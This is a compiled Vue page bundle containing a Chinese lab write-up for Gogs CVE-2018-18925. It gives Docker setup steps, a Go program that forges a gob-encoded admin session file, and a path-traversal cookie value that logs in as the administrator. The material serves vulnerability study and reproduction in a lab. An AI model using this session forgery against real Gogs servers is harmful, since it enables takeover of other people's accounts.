import{_ as o}from"./plugin-vue_export-helper-c27b6911.js";import{r as e,o as p,c,a as n,b as s,d as t,e as i}from"./app-58e4a7d6.js";const l={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,"gogs是一款极易搭建的自助Git服务平台，具有易安装、跨平台、轻量级等特点，使用者众多。",-1),d=n("p",null,"其0.11.66及以前版本中，（go-macaron/session库）没有对sessionid进行校验，攻击者利用恶意sessionid即可读取任意文件，通过控制文件内容来控制session内容，进而登录任意账户。",-1),k=n("p",null,"参考链接：",-1),b={href:"https://github.com/gogs/gogs/issues/5469",target:"_blank",rel:"noopener noreferrer"},v={href:"https://xz.aliyun.com/t/3168",target:"_blank",rel:"noopener noreferrer"},m={href:"https://www.anquanke.com/post/id/163575",target:"_blank",rel:"noopener noreferrer"},g=i(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动gogs：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:3000</code>，即可看到安装页面。安装时选择sqlite数据库，并开启注册功能。</p><p>安装完成后，需要重启服务：<code>docker-compose restart</code>，否则session是存储在内存中的。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>使用Gob序列化生成session文件：</p><div class="language-go line-numbers-mode" data-ext="go"><pre class="language-go"><code><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
    <span class="token string">&quot;bytes&quot;</span>
    <span class="token string">&quot;encoding/gob&quot;</span>
    <span class="token string">&quot;encoding/hex&quot;</span>
    <span class="token string">&quot;fmt&quot;</span>
    <span class="token string">&quot;io/ioutil&quot;</span>
    <span class="token string">&quot;os&quot;</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">EncodeGob</span><span class="token punctuation">(</span>obj <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> obj <span class="token punctuation">{</span>
        gob<span class="token punctuation">.</span><span class="token function">Register</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    buf <span class="token operator">:=</span> bytes<span class="token punctuation">.</span><span class="token function">NewBuffer</span><span class="token punctuation">(</span><span class="token boolean">nil</span><span class="token punctuation">)</span>
    err <span class="token operator">:=</span> gob<span class="token punctuation">.</span><span class="token function">NewEncoder</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Encode</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>
    <span class="token keyword">return</span> buf<span class="token punctuation">.</span><span class="token function">Bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> err
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> uid <span class="token builtin">int64</span> <span class="token operator">=</span> <span class="token number">1</span>
    obj <span class="token operator">:=</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">&quot;_old_uid&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;1&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;uid&quot;</span><span class="token punctuation">:</span> uid<span class="token punctuation">,</span> <span class="token string">&quot;uname&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;root&quot;</span><span class="token punctuation">}</span>
    data<span class="token punctuation">,</span> err <span class="token operator">:=</span> <span class="token function">EncodeGob</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>
    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    err <span class="token operator">=</span> ioutil<span class="token punctuation">.</span><span class="token function">WriteFile</span><span class="token punctuation">(</span><span class="token string">&quot;data&quot;</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> os<span class="token punctuation">.</span>O_CREATE<span class="token operator">|</span>os<span class="token punctuation">.</span>O_WRONLY<span class="token punctuation">)</span>
    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    edata <span class="token operator">:=</span> hex<span class="token punctuation">.</span><span class="token function">EncodeToString</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>edata<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后注册一个普通用户账户，创建项目，并在“版本发布”页面上传刚生成的session文件：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/1-168180234273219.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>通过这个附件的URL，得知这个文件的文件名：<code>./attachments/2eb7f1a2-b5ec-482e-a297-15b625d24a10</code>。</p><p>然后，构造Cookie：<code>i_like_gogits=../attachments/2/e/2eb7f1a2-b5ec-482e-a297-15b625d24a10</code>，访问即可发现已经成功登录id=1的用户（即管理员）：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/2-168180234273320.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>完整的利用过程与原理，可以阅读参考链接中的文章。</p>`,14);function f(h,_){const a=e("ExternalLinkIcon");return p(),c("div",null,[u,r,d,k,n("ul",null,[n("li",null,[n("a",b,[s("https://github.com/gogs/gogs/issues/5469"),t(a)])]),n("li",null,[n("a",v,[s("https://xz.aliyun.com/t/3168"),t(a)])]),n("li",null,[n("a",m,[s("https://www.anquanke.com/post/id/163575"),t(a)])])]),g])}const y=o(l,[["render",f],["__file","Gogs 任意用户登录漏洞 CVE-2018-18925.html.vue"]]);export{y as default};
